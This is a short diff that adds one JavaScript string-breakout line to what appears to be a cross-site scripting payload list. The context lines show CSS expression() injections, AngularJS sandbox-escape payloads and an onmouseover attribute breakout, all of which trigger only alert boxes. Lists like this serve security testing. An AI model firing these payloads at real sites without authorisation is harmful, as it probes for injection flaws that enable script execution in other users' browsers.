@@ -14,6 +14,7 @@
 }%0a{}*{x:expression(alert(1))}%0a{
 expression(alert(1))
 {x:expression(alert(1))}
+'+alert(document.domain)+' 
 $eval('x=alert(/Mik/)');}}
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(/Mik/)');}}
 ” onmouseover=alert(1)//
